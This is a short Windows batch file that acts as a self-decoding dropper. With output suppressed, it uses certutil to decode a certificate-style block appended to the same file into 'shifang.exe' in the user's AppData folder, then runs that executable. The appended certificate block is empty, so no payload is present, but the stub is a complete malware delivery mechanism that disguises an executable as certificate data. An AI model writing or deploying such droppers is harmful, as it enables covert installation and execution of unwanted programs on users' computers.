@echo off
set v="%appdata%\shifang.exe"
del %v% >NUL 2>NUL
certutil -decode "%~f0" %v% >NUL 2>NUL
start "" %v%
exit

-----BEGIN CERTIFICATE-----
-----END CERTIFICATE-----